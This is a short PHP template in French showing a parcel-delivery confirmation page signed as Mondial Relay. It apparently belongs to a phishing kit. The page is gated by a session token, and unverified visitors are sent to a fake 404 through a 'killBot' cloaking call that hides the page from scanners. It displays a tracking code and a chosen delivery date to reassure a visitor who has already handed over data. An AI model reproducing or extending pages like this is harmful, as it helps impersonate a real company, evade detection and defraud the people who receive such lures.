<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

require_once(b . '/views/components/header.php');
?>
<h2>Numéro de suivi : <?= $config['code'] ?></h2>
<h3>Créneau de livraison</h3>
<p style="text-align: center">Vous avez choisi une livraison le <br><strong><?= $_SESSION['date'] ?></strong>.
</p>
<div class="notifications">
    <p class="notification notification-success" role="alert">
        Votre demande de livraison a bien été prise en compte. <br>Merci de votre confiance et à bientôt ! <br> <br>
        L'équipe de livraison, <br>
        Mondial Relay
    </p>
</div>
<?php
require_once(b . '/views/components/footer.php');
